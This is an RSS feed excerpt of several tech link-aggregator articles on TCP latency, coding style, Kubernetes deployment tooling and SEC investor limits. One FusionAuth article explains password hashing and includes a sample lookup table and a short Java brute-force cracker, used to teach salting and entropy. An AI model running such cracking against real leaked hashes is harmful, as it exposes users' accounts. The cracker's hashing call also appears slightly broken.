have really small answers) and gets sent, no matter if it’s submitted to the
kernel by one big or two small buffers.</p>

<p>On the other hand, if we split the submission into two syscalls, this is what
happens:</p>

<ul>
  <li>We write the first part (headers). The kernel sends them out as an undersized
packet.</li>
  <li>We write the second part (the body). But the kernel shelves them into the send
buffer and waits for sending them until it sees the <code>ACK</code>, because there’s one
undersized packet …</li></ul></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vorner.github.io/2020/11/06/40-ms-bug.html">https://vorner.github.io/2020/11/06/40-ms-bug.html</a></em></p>]]>
            </description>
            <link>https://vorner.github.io/2020/11/06/40-ms-bug.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133127</guid>
            <pubDate>Wed, 18 Nov 2020 04:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Math of Password Hashing Algorithms and Entropy (2019)]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25133061">thread link</a>) | @mooreds
<br/>
November 17, 2020 | https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>Here’s the reality, billions of credentials have been leaked or stolen and are now easily downloaded online by anyone. Many of these databases of identities include passwords in plain text, while others are one-way hashed. One-way hashing is better (we’ll get to why in a second), but it is only as secure as is mathematically feasible. Let’s take a look at one-way hashing algorithms and how computers handle them.</p>

<h2 id="hashing">Hashing</h2>

<p>A hash by definition is a function that can map data of an arbitrary size to data of a fixed size. SHA2 is a hashing algorithm that uses various bit-wise operations on any number of bytes to produce a fixed sized hash. For example, the SHA-256 algorithm produces a 256 bit result. The algorithm was designed specifically so that going from a hash back to the original bytes is infeasible. Developers use an SHA2 hash so that instead of storing a plain text password, they instead only store the hash. When a user is authenticated, the plain text password they type into the login form is hashed, and because the algorithm will always produce the same hash result given the same input, comparing this hash to the hash in the database tells us the password is correct.</p>

<h2 id="cracking-passwords">Cracking Passwords</h2>

<p>While one-way hashing means we aren’t storing plain text passwords, it is still possible to determine the original plain text password from a hash. Next, we’ll outline the two most common approaches of reversing a hash.</p>

<h3 id="lookup-tables">Lookup Tables</h3>

<p>The first is called a lookup table, or sometimes referred to as a rainbow table. This method builds a massive lookup table that maps hashes to plain text passwords. The table is built by simply hashing every possible password combination and storing it in some type of database or data-structure that allows for quick lookups.</p>

<p>Here’s an example of a lookup table for SHA2 hashed passwords:</p>

<div><div><pre><code><span>sha2_hash                                                          password</span>
<span>-----------------------------------------------------------------------------------------</span>
<span>e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0   </span><span>123456</span>
<span>e5d316bfd85b606e728017e9b6532e400f5f03e49a61bc9ef59ec2233e41015a   broncosfan123</span>
<span>561acac680e997e22634a224df2c0931cf80b9f7c60102a4e12e059f87558232   Letmein</span>
<span>bdc511ea9b88c90b75c3ebeeb990e4e7c813ee0d5716ab0431aa94e9d2b018d6   newenglandclamchowder</span>
<span>9515e65f46cb737cd8c191db2fd80bbd05686e5992b241e8ad7727510b7142e6   opensesame</span>
<span>6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e   password</span>
<span>c194ead20ad91d30c927a34e8c800cb9a13a7e445a3ffc77fed14176edc3c08f   xboxjunkie42</span>
</code></pre></div></div>

<p>Using a lookup table, all the attacker needs to know is the SHA2 hash of the password and they can see if it exists in the table. For example, let’s assume for a moment that Netflix stores your password using an SHA2 hash. If Netflix is breached, their user database is likely now available to anyone with a good internet connection and a torrent client. Even a mediocre hacker now only needs to lookup the SHA2 hash associated with your Netflix account to see if it exists in their lookup table. This will reveal nearly instantly what your plain text password is for Netflix. Now, this hacker can log in to your Netflix account and binge watch all four seasons of Fuller House (“how rude!”). And he can also try this password on Hulu and HBO Go to see if you used the same email address and password for those accounts as well.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/salt.png" alt="Salt"></p>

<p>The best way to protect against this type of attack is to use what is called a <strong>salt</strong>. A salt is simply a bunch of random characters that you prepend to the password before it is hashed. Each password should have a different salt, which means that a lookup table is unlikely to have an entry for the combination of the salt and the password. This makes salts an ideal defense against lookup tables.</p>

<p>Here’s an example of a salt and the resulting combination of the password and the salt which is then hashed:</p>

<div><div><pre><code><span>// Bad, no salt. Very bland.</span>
<span>sha2</span><span>(</span><span>"password"</span><span>)</span> <span>// 6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e</span>

<span>// Better, add a salt.</span>
<span>salt</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3a"</span>
<span>toHash</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3apassword"</span>
<span>sha2</span><span>(</span><span>toHash</span><span>)</span> <span>// f534e6bf84a638112e07e69861927ab624c0217c0655e4d3be07659bcf6c1c07</span>
</code></pre></div></div>

<p>Now that we have added the salt, the “password” that we actually generated the hash from was the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>. This String is long, complex and contains a lot of random characters. Therefore, it is nearly impossible that the hacker that created the lookup table would have generated the hash for the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>.</p>

<h3 id="brute-force">Brute Force</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/hulk.png" alt="Brute Force"></p>

<p>The second method that attackers use to crack passwords is called brute force cracking. This means that the attacker writes a computer program that can generate all possible combinations of characters that can be used for a password and then computes the hash for each combination. This program can also take a salt if the password was hashed with a salt. The attacker then runs the program until it generates a hash that is the same as the hash from the database. Here’s a simple Java program for cracking passwords. We left out some detail to keep the code short (such as all the possible password characters), but you get the idea.</p>



<div><div><pre><code><span>import</span> <span>org.apache.commons.codec.digest.DigestUtils</span><span>;</span>

<span>public</span> <span>class</span> <span>PasswordCrack</span> <span>{</span>
  <span>public</span> <span>static</span> <span>final</span> <span>char</span><span>[]</span> <span>PASSWORD_CHARACTERS</span> <span>=</span> <span>new</span> <span>char</span><span>[]</span> <span>{</span><span>'a'</span><span>,</span> <span>'b'</span><span>,</span> <span>'c'</span><span>,</span> <span>'d'</span><span>};</span>

  <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>...</span> <span>args</span><span>)</span> <span>{</span>
    <span>String</span> <span>salt</span> <span>=</span> <span>args</span><span>[</span><span>0</span><span>];</span>
    <span>String</span> <span>hashFromDatabase</span> <span>=</span> <span>args</span><span>[</span><span>1</span><span>].</span><span>toUpperCase</span><span>();</span>

    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>6</span><span>;</span> <span>i</span> <span>&lt;=</span> <span>8</span><span>;</span> <span>i</span><span>++)</span> <span>{</span>
      <span>char</span><span>[]</span> <span>ca</span> <span>=</span> <span>new</span> <span>char</span><span>[</span><span>i</span><span>];</span>

      <span>fillArrayHashAndCheck</span><span>(</span><span>ca</span><span>,</span> <span>0</span><span>,</span> <span>salt</span><span>,</span> <span>hashFromDatabase</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>private</span> <span>static</span> <span>void</span> <span>fillArrayHashAndCheck</span><span>(</span><span>char</span><span>[]</span> <span>ca</span><span>,</span> <span>int</span> <span>index</span><span>,</span> <span>String</span> <span>salt</span><span>,</span> <span>String</span> <span>hashFromDatabase</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>PASSWORD_CHARACTERS</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++)</span> <span>{</span>
      <span>ca</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>PASSWORD_CHARACTERS</span><span>[</span><span>i</span><span>];</span>

      <span>if</span> <span>(</span><span>index</span> <span>&lt;</span> <span>ca</span><span>.</span><span>length</span> <span>-</span> <span>1</span><span>)</span> <span>{</span>
        <span>fillArrayHashAndCheck</span><span>(</span><span>ca</span><span>,</span> <span>index</span> <span>+</span> <span>1</span><span>,</span> <span>salt</span><span>,</span> <span>hashFromDatabase</span><span>);</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>String</span> <span>password</span> <span>=</span> <span>salt</span> <span>+</span> <span>new</span> <span>String</span><span>(</span><span>ca</span><span>);</span>
        <span>String</span> <span>sha2Hex</span> <span>=</span> <span>DigestUtils</span><span>.</span><span>sha2Hex</span><span>(</span><span>password</span><span>).</span><span>toUpperCase</span><span>();</span>
        <span>if</span> <span>(</span><span>sha2Hex</span><span>.</span><span>equals</span><span>(</span><span>hashFromDatabase</span><span>))</span> <span>{</span>
          <span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>"plain text password is ["</span> <span>+</span> <span>password</span> <span>+</span> <span>"]"</span><span>);</span>
          <span>System</span><span>.</span><span>exit</span><span>(</span><span>0</span><span>);</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This program will generate all the possible passwords with lengths between 6 and 8 characters and then hash each one until it finds a match. This type of brute-force hacking takes time because of the number of possible combinations.</p>

<h2 id="password-complexity-vs-computational-power">Password complexity vs. computational power</h2>

<p>Let’s bust out our TI-85 calculators and see if we can figure out how long this program will take to run. For this example we will assume the passwords can only contain ASCII characters (uppercase, lowercase, digits, punctuation). This set is roughly 100 characters (this is rounded up to make the math easier to read). If we know that there are at least 6 characters and at most 8 characters in a password, then all the possible combinations can be represented by this expression:</p>

<div><div><pre><code>possiblePasswords = 100^8 + 100^7 + 100^6
</code></pre></div></div>

<p>The result of this expression is equal to <code>10,101,000,000,000,000</code>. This is quite a large number, North of 10 quadrillion to be a little more precise, but what does it actually mean when it comes to our cracking program? This depends on the speed of the computer the cracking program is running on and how long it takes the computer to execute the SHA2 algorithm. The algorithm is the key component here because the rest of the program is extremely fast at creating the passwords.</p>

<p>Here’s where things get dicey. If you run a quick Google search for <a href="http://lmgtfy.com/?q=fastest+bitcoin+rig">“fastest bitcoin rig”</a> you’ll see that these machines are rated in terms of the number of hashes they can perform per second. The bigger ones can be rated as high as <code>44 TH/s</code>. That means it can generate 44 tera-hashes per second or <code>44,000,000,000,000</code>.</p>

<p>Now, if we divide the total number of passwords by the number of hashes we can generate per second, we are left with the total time it takes a Bitcoin rig to generate the hashes for all possible passwords. In our example above, this equates to:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^8 + 100^7 + 100^6 = 1.0101e16

numberOfSeconds = possiblePasswords / bitcoinRig = ~230
numberOfMinutes = numberOfSeconds / 60 = ~4
</code></pre></div></div>

<p>This means that using this example Bitcoin rig, we could generate all the hashes for a password between 6 and 8 characters in length in roughly 4 minutes. Feeling nervous yet? Let’s add one additional character and see long it takes to hash all possible passwords between 6 and 9 characters.</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^9 + 100^8 + 100^7 + 100^6 = 1.010101E18

numberOfSeconds = possiblePasswords / bitcoinRig = 22,956
numberOfMinutes = numberOfSeconds / 60 = ~383
numberOfHours = numberOfMinutes / 60 = ~6
</code></pre></div></div>

<p>By adding one additional character to the potential length of the password we increased the total compute time from 4 minutes to 6 hours. This is nearing a 100x increase in computational time to use the brute force strategy. You probably can see where this is going. To defeat the brute force strategy, you simply need to make it improbable to calculate all possible password combinations.</p>

<p>Let’s get crazy and make a jump to 16 characters:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^16 + 100^15 ... 100^7 + 100^6 = 1e32

numberOfSeconds = possiblePasswords / bitcoinRig = 2.27e18
numberOfMinutes = numberOfSeconds / 60 = 3.78e16
numberOfHours = numberOfMinutes / 60 = 630,000,000,000,000 or 630 trillion
numberOfDays = numberOfHours / 24 = 26,250,000,000,000 or 26.25 trillion days
numberOfYears = numberOfDays / 365 = 71,917,808,219 or 71.9 billion years
</code></pre></div></div>

<p>To boil down our results, if we take these expressions and simplify them, we can build an equation that solves for any length password.</p>

<div><div><pre><code>numberOfSeconds = 100^lengthOfPassword / computeSpeed
</code></pre></div></div>

<p>This equation shows that as the password length increases, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy/">https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133061</guid>
            <pubDate>Wed, 18 Nov 2020 04:00:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write Code Like You Write a Recipe]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 84 (<a href="https://news.ycombinator.com/item?id=25133041">thread link</a>) | @ahungry
<br/>
November 17, 2020 | https://ahungry.com/blog/2020-11-17-Write-Code-Like-You-Write-a-Recipe.html | <a href="https://web.archive.org/web/*/https://ahungry.com/blog/2020-11-17-Write-Code-Like-You-Write-a-Recipe.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-orgdb8398b">
<p>
As it tends to do, time continues to move on.  The project and code in
it eventually becomes legacy code (aka, someone else's problem to
maintain).
</p>

<p>
One day, the business drudges up that old automated cookie creation
idea and requests that it handles a new task - "instead of just cooking
peanut butter cookies, it'd be great if the cookie system could handle
oatmeal raisin as well!".
</p>

<p>
Hah!  You remember that old system, but you're onto newer and better
things.  This is a perfect task for the intern to sink their teeth
into - afterall, it's legacy and not high profile, it's been stable,
and it was so simple to implement the first time around.
</p>

<p>
The new set of requirements/recipe the intern works off of looks very
similar to the initial ones:
</p>

<ul>
<li>Step 1: Preheat oven to 325F, grease cookie sheet</li>
<li>Step 2: In bowl, stir oats, pumpkin puree and sugar until smooth.</li>
<li>Step 3: Beat in one egg white, then stir in baking soda, salt, and cinnamon.</li>
<li>Step 4: Roll dough into 1 inch balls and place 2 inches apart on the sheet.</li>
<li>Step 5: Bake for 8 minutes, cool for 5, enjoy!</li>
</ul>

<p>
He eagerly begins to expand the original code to handle the new case:
</p>

<div>
<pre><span>function</span> <span>makeCookies</span> <span>(</span><span>type</span> = <span>'peanut-butter'</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>type === <span>'peanut-butter'</span><span>)</span> <span>{</span>
    oven.setTemperature<span>(</span>350<span>)</span>
  <span>}</span>

  <span>if</span> <span>(</span>type === <span>'oatmeal-raisin'</span><span>)</span> <span>{</span>
    oven.setTemperature<span>(</span>325<span>)</span>
  <span>}</span>

  sheet.grease<span>()</span>

  <span>if</span> <span>(</span>type === <span>'peanut-butter'</span><span>)</span> <span>{</span>
    bowl.add<span>(</span>peanutButter<span>)</span>
    bowl.add<span>(</span>sugar<span>)</span>
  <span>}</span>

  <span>if</span> <span>(</span>type === <span>'oatmeal-raisin'</span><span>)</span> <span>{</span>
    bowl.add<span>(</span>oats<span>)</span>
    bowl.add<span>(</span>pumpkinPuree<span>)</span>
    bowl.add<span>(</span>sugar<span>)</span>
  <span>}</span>

  bowl.stir<span>()</span>

  <span>if</span> <span>(</span>type === <span>'peanut-butter'</span><span>)</span> <span>{</span>
    bowl.beat<span>(</span>egg<span>)</span>
    bowl.beat<span>(</span>egg<span>)</span>
    bowl.stirIn<span>(</span><span>[</span>bakingSoda, salt, vanilla<span>]</span><span>)</span>
  <span>}</span>

  <span>if</span> <span>(</span>type === <span>'oatmeal-raisin'</span><span>)</span> <span>{</span>
    bowl.beat<span>(</span>eggWhite<span>)</span>
    bowl.stirIn<span>(</span><span>[</span>bakingSoda, salt, cinnamon<span>]</span><span>)</span>
  <span>}</span>

  <span>const</span> <span>dough</span> = bowl.makeDough<span>()</span>
  sheet.add<span>(</span>dough.balls<span>()</span><span>)</span>
  oven.add<span>(</span>sheet<span>)</span>

  <span>if</span> <span>(</span>type === <span>'peanut-butter'</span><span>)</span> <span>{</span>
    oven.setTimer<span>(</span>10<span>)</span>
  <span>}</span>

  <span>if</span> <span>(</span>type === <span>'oatmeal-raisin'</span><span>)</span> <span>{</span>
    oven.setTimer<span>(</span>8<span>)</span>
  <span>}</span>

  <span>const</span> <span>cookies</span> = oven.remove<span>(</span>sheet<span>)</span>
  sheet.cool<span>(</span>5<span>)</span>

  <span>return</span> cookies
<span>}</span>
</pre>
</div>

<p>
The code comes in, the peer reviews pass it as it meets the
requirements and nothing is obviously wrong.  Still, it has become a
bit harder to understand and you're left with a nagging feeling.
</p>
</div></div>]]>
            </description>
            <link>https://ahungry.com/blog/2020-11-17-Write-Code-Like-You-Write-a-Recipe.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133041</guid>
            <pubDate>Wed, 18 Nov 2020 03:56:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[curl https://v2.wttr.in/London]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25132760">thread link</a>) | @tosh
<br/>
November 17, 2020 | https://v2.wttr.in/London | <a href="https://web.archive.org/web/*/https://v2.wttr.in/London">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://v2.wttr.in/London</link>
            <guid isPermaLink="false">hacker-news-small-sites-25132760</guid>
            <pubDate>Wed, 18 Nov 2020 03:09:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[K8s Workflows with Armory and Spinnaker, from Day 0 to Deployment]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25132748">thread link</a>) | @drodio
<br/>
November 17, 2020 | https://www.armory.io/blog/k8s-workflows-with-armory-spinnaker-from-day-0-to-deployment/ | <a href="https://web.archive.org/web/*/https://www.armory.io/blog/k8s-workflows-with-armory-spinnaker-from-day-0-to-deployment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
                

        <main id="global-main">

                        
                        



<section>
    <div>
        <div id="post-7793">
          
            
            <div><figure><img width="800" height="303" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.00.15-PM-e1605597986841.png" alt="" loading="lazy"></figure></div>            <div>
                
                <h2><b>Armory, Spinnaker, and Kubernetes</b></h2>
<p><span>We are excited to announce that Armory now provides a K8s-native continuous delivery experience from end-to-end, unlocking Kubernetes deployments in the enterprise at massive scale. As a cloud-native, multi-cloud CD platform, Spinnaker has always been a powerful tool for deploying to Kubernetes. In fact, AWS and Google engineering teams helped to build the </span><a href="https://www.armory.io/blog/deep-dive-into-clouddriver/"><span>Spinnaker Clouddrivers</span></a><span> for deploying to EKS and GKE, and Spinnaker powers more than </span><b>8 million monthly K8s deployments</b><span>.&nbsp;</span></p>
<p><img loading="lazy" data-src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png" alt="" width="631" height="337" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png"></p>
<p><em>Monthly OSS Spinnaker deployments to K8s are up 5x since April.</em></p>
<p><span>Armory is enhancing Spinnaker by introducing a familiar Kubernetes workflow, eliminating context-switching and domain-specific languages, and helping Spinnaker scale deployments to thousands of Kubernetes clusters.</span></p>
<h2><b>Day 0: The Armory Operator</b></h2>
<p><span>The </span><a href="https://www.armory.io/blog/announcing-the-spinnaker-kubernetes-operator/"><span>Armory Operator</span></a><span> is a Kubernetes operator for implementing and managing Spinnaker, bringing a Kubernetes-native GitOps workflow to managing Spinnaker’s full lifecycle. With the Operator, you treat Spinnaker as simply another Kubernetes deployment, installing, managing, and upgrading it with familiar tools such as <code>kubectl</code> and <code>kustomize</code>. Install Spinnaker with just a few keystrokes, and upgrade your Spinnaker version simply by changing the version number in a config file and applying. Access to other Kubernetes features, such as Kubernetes Secrets, also comes enabled out of the box.</span></p>
<p><span>The Operator also unlocks the scalability and security of a GitOps workflow by defining all of your Spinnaker configs as code and centralizing them in a single Git repo. This enables collaborative code reviews on all config changes to ensure that Spinnaker is stable and secure. Pre-flight validation of all changes adds a further layer of safety. In the event of a bad update, built-in config version control allows for rapid rollbacks and auditability.</span></p>
<p><span>The Operator is available for both Armory and open source Spinnaker.</span></p>
<h2><b>Building your Deployment Pipelines: PaCRD</b></h2>
<p><a href="https://docs.armory.io/docs/spinnaker-user-guides/pacrd/"><span>PaCRD</span></a><span> (a combination of “</span><a href="https://www.armory.io/armory-enterprise-spinnaker/pipelines-as-code-gitops/"><span>Pipelines as Code</span></a><span>” and “</span><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/"><span>Custom Resource Definition</span></a><span>”) is a Kubernetes controller that manages the lifecycle of Spinnaker applications and pipelines as objects within your K8s cluster. PaCRD extends Kubernetes functionality to support Spinnaker Application and Pipeline objects that can be observed for changes through a mature lifecycle management API.</span></p>
<p><span>With PaCRD you can:</span></p>
<ul>
<li><span>Maintain your Spinnaker pipelines as code with the rest of your Kubernetes manifests.</span></li>
<li><span>Persist Pipeline and Application changes with confidence to your Spinnaker cluster.</span></li>
<li><span>Leverage existing tools <code>helm</code> and <code>kustomize</code> to template your pipelines across teams and projects.</span></li>
</ul>
<p><span>Pipelines as Code is one of Armory’s most powerful features. It brings security and repeatability to your application deployments by enabling you to templatize and share pre-blessed pipelines that are up-to-date with your organizational best practices and security &amp; compliance policies. With PaCRD, we are providing another method for accessing those benefits, but with a K8s-native workflow and some additional Kubernetes functionality.</span></p>
<p><span>PaCRD is available as an early release feature with select </span><a href="https://www.armory.io/armory-design-partners/"><span>Armory Design Partners</span></a><span>.&nbsp;</span></p>
<h2><b>Deployment to Production: The Armory Agent for Kubernetes&nbsp;</b></h2>
<p><span>Spinnaker is the tool of choice for hundreds of the world’s leading enterprises to deploy to Kubernetes. The </span><a href="https://www.armory.io/armory-enterprise-spinnaker/armory-agent-for-kubernetes/"><span>Armory Agent for Kubernetes</span></a><span> adds further scalability and security to Kubernetes deployments on Spinnaker, unlocking enterprise use cases at the highest scale as you expand your Kubernetes footprint. With the Agent, you can deploy to thousands of Kubernetes clusters as easily as you deploy to two.&nbsp;</span></p>
<p><span>The Agent acts as a highly performant and efficient Kubernetes controller on behalf of Spinnaker’s Clouddriver service. Its distributed, optimized caching model eliminates latency and accelerates pipeline execution times, while its decentralized account management design enhances security and enables individual teams to manage permissions for their specific clusters. These security and account management features are also enabling </span><a href="https://www.armory.io/armory-cloud/"><span>Armory Cloud</span></a><span>, a SaaS version of the Armory Platform that is currently in early release (request early access </span><a href="https://www.armory.io/armory-cloud-signup/"><span>here</span></a><span>).&nbsp;&nbsp;</span><img loading="lazy" data-src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png" alt="" width="591" height="368" srcset="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png 768w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-1024x637.png 1024w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-360x224.png 360w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM.png 1164w" sizes="(max-width: 591px) 100vw, 591px" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png"></p>
<p><em>The Armory Agent in Agent mode (other modes available).</em></p>
<h2><b>The Proof Is in the Pudding</b></h2>
<p><span>Spinnaker today handles millions of Kubernetes deployments from thousands of users, and that number will only continue to accelerate with the new features Armory has been rolling out to our customers and the broader community. Here are what some of those customers have to say:</span></p>
<blockquote><p><i><span>“The Armory platform has been a huge upgrade over our existing tooling in helping us quickly roll out innovative solutions with confidence. As a cloud-native continuous delivery platform designed for scale in a microservices world, Armory has helped OpenGov scale up from twenty to more than a hundred Kubernetes services.”</span></i></p>
<p><span>– Ashwani Wason, VP of Engineering &amp; Operations at OpenGov</span></p></blockquote>

<blockquote><p><i><span>“With Armory’s help, we’ve scaled up Spinnaker to support daily deployments to 30+ Kubernetes clusters and multiple environments.”</span></i></p>
<p><span>– Paul Selden, Principal Engineer at OpenX</span></p></blockquote>
<p><span>Read about how other companies are leveraging Armory and Spinnaker </span><a href="https://www.armory.io/learn/customer-success-stories/"><span>here</span></a><span>.</span></p>
<h2><b>Wrap-Up</b></h2>
<p><span>From implementing and managing Spinnaker to building and sharing your deployment pipelines to deploying your applications into production environments at largest scale, Armory and Spinnaker provide a deep Kubernetes-native workflow and set of functionality. Join dozens of the world’s leading enterprises, from hyper-growth startups to Fortune 20 banks, in deploying to K8s with Armory. Reach out to us </span><a href="https://www.armory.io/contact-us/"><span>here</span></a><span> to learn more about accelerating your Kubernetes deployments.</span></p>
            </div>
        </div>
    </div>
</section>



<section>
  
</section>
<section>
  <div>
    <div>
      <div>
        <div>

      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/11/Spinnaker-Liquibase-Icon.png" alt=""></p>
  
    
  
    <p>How to Set Up Liquibase in Spinnaker</p>
  
    <p>Note: We are delighted to host this guest post by&nbsp;Robert Reeves, Co-Founder &amp; CTO of Liquibase. The post can also be found on the&nbsp;Liquibase Blog. Liquibase simplifies and automates database deployment and configuration for applications.</p>
  
  
</div>
      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/11/grab-logo-png-transparent-768x296.png" alt=""></p>
  
    
  
    <p>Our Journey to Continuous Delivery at Grab (Part 1)</p>
  
    <p>Note: We are delighted to host this guest post by Sylvain Bougerel from Grab. The post can also be found on the&nbsp;Grab Tech Blog. Grab is a Singapore-based technology company offering ride-hailing transport services, food delivery, and payment solutions in addition to being the most well-funded private fintech startup in the market in Southeast Asia.</p>
  
  
</div>
      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/11/MicrosoftTeams.png" alt=""></p>
  
    
  
    <p>Spinnaker Adds Microsoft Teams Notification Support</p>
  
    <p>Microsoft Teams is now supported Microsoft Teams notification support is now available in Spinnaker 1.23.0.</p>
  
  
</div>
  
        </div>
      </div>
    </div>
  </div>
</section>


        </main>

        

        </div></div>]]>
            </description>
            <link>https://www.armory.io/blog/k8s-workflows-with-armory-spinnaker-from-day-0-to-deployment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25132748</guid>
            <pubDate>Wed, 18 Nov 2020 03:06:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forcing Small Investors Out of Big Opportunities: SEC’s 99 Investor Limit]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25132612">thread link</a>) | @rmason
<br/>
November 17, 2020 | https://tinyseed.com/latest/99-investor-problem | <a href="https://web.archive.org/web/*/https://tinyseed.com/latest/99-investor-problem">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e7b2ccadd106c01a49f9"><div><h3>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>, <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</h3><p>At TinySeed, we are in the process of <a href="https://tinyseed.com/latest/invest">raising the second fund</a> for our SaaS accelerator, and we’re often asked why we have such a high minimum investment. If an <a href="https://www.investopedia.com/terms/a/accreditedinvestor.asp">accredited investor</a> wants to put in $50,000, why would we turn them down?&nbsp;</p><p>It all comes down to SEC regulations, which limit funds like ours to a maximum of 99 accredited investors. In order to raise the amount of capital required to execute on <a href="https://tinyseed.com/thesis">our investment thesis</a>, we must enforce a (relatively) high minimum investment.&nbsp;</p><p>We didn’t write this article to complain about our situation, as <a href="https://tinyseed.com/invest">fundraising (even with this minimum in place) is going quite well</a>. But for us, this process has brought to light an unintended consequence of this 99 investor limit.</p><p>Over time, successful venture firms raise larger and larger funds, quickly running into the 99 investor limit, and forcing their investment minimum higher. <strong>These high minimums concentrate this wealth creation opportunity to super high net worth individuals and institutional investors, excluding accredited investors who cannot afford to write such a large check.</strong></p><p>The SEC enforces certain kinds of regulations to provide investor protections against fraud and abuse, which we salute. However, current regulations (and this 99 investor limit) prohibit the average accredited investor from accessing these markets in a meaningful way. This matters because the private markets are a significant driver of wealth creation.</p><p>We fully understand that the SEC needs to have some limit on the number of investors that can invest in a private fund. <strong>However, we believe that the current limit of 99 is the wrong approach.&nbsp;</strong></p><p>We started TinySeed because we wanted to give founders more options for capital to grow their companies, and we feel that as a fund, we can and should also call for change in how sophisticated investors are able to invest their money.<strong><em> </em></strong>Specifically, we believe that successful tech founders and operators should be able to invest into the field they understand best — early stage technology — instead of being limited to real estate or the public markets.</p><p>We believe funds like ours should be able admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are accredited.</p><h3>As the current rules are enshrined in law, we’re exploring ways to bring this issue in front of Congress. <strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20">Share on Twitter</a></p></li><li><p><a 